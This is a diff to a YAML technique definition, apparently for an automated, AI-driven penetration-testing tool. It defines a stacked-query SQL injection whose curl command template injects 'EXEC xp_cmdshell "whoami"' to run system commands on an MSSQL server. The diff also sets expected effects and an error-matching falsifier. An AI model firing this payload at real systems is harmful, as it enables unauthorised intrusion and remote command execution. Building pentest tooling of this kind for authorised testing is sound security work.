@@ -2,15 +2,20 @@ name: sqli_stacked
 category: web
 description: Stacked queries SQL injection
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}?id=1;EXEC xp_cmdshell "whoami"--'"
-parser: null
+command_template: 'curl -s ''{target_url}?id=1;EXEC xp_cmdshell "whoami"--''
+
+  '
+parser: web_response_parser
 expected_effects:
-  - action_completed
+- sqli_confirmed
+- database_access
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Stacked queries: multiple statements separated by semicolon. Enables: INSERT/UPDATE/DELETE, xp_cmdshell (MSSQL), COPY (PostgreSQL), INTO OUTFILE (MySQL)."
+mechanism: 'Stacked queries: multiple statements separated by semicolon. Enables:
+  INSERT/UPDATE/DELETE, xp_cmdshell (MSSQL), COPY (PostgreSQL), INTO OUTFILE (MySQL).'
+hacktricks_ref: pentesting-web/sql-injection/postgresql-injection/README.md
